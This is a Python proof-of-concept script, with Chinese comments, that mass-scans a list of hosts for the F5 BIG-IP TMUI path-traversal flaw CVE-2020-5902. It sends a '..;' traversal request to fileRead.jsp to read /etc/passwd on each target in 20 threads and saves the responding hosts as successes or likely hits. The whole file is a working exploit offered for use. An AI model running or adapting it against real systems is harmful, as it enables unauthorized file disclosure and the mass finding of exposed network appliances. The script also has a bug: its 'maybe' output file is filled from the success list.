import requests
import sys
from concurrent.futures import ThreadPoolExecutor
import urllib3  #防止报错
import re
import json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = '''
-------------------------------------------------------------------------------------
    version  : python 3.7
    Usage    : python CVE-2020-5902.py infile.txt

                Python By 小受
-------------------------------------------------------------------------------------            
'''

headers = {
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
}

success = []
maybe = []

def poc(url):
    '''
    1.将放回数据转换为json，如果存在key output且不为空说明执行成功
    2.如果转换失败
    :param url:
    :return:
    '''
    url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
    response = requests.get(url, headers=headers, verify=False, timeout=5)
    if response.status_code == 200:
        try:
            text = json.loads(response.text)
            if text['output']:
                print(url, 'success')
                success.append(url)
            else:
                pattern1 = re.compile(r'output')
                pattern2 = re.compile(r'root')
                log1 = pattern1.findall(response.text)
                log2 = pattern2.findall(response.text)
                if log1 and log2:
                    print(url, 'maybe')
                    maybe.append(url)
        except:
            print(url,'change json err')
    else:
        print(url, 'connect err')


def get_urls(file):
    with open(file,'r+') as rf:
        urls = rf.readlines()
    rf.close()
    return urls

if __name__ == '__main__':
    print(banner)
    if len(sys.argv) < 2:
        pass
    else:
        file = sys.argv[1]
        urls = get_urls(file)
        exeutor = ThreadPoolExecutor(max_workers=20)
        for u in urls:
            u = u.strip('\n')
            all_task = exeutor.submit(poc,u)
        exeutor.shutdown()
        print('success: ', len(success))
        if len(success) != 0:
            with open('success.txt','w+') as wf:
                for u in success:
                    u = u + '\n'
                    wf.write(u)
            wf.close()
        print('maybe: ', len(maybe))
        if len(maybe) != 0:
            with open('maybe.txt','w+') as wf:
                for u in success:
                    u = u + '\n'
                    wf.write(u)
            wf.close()


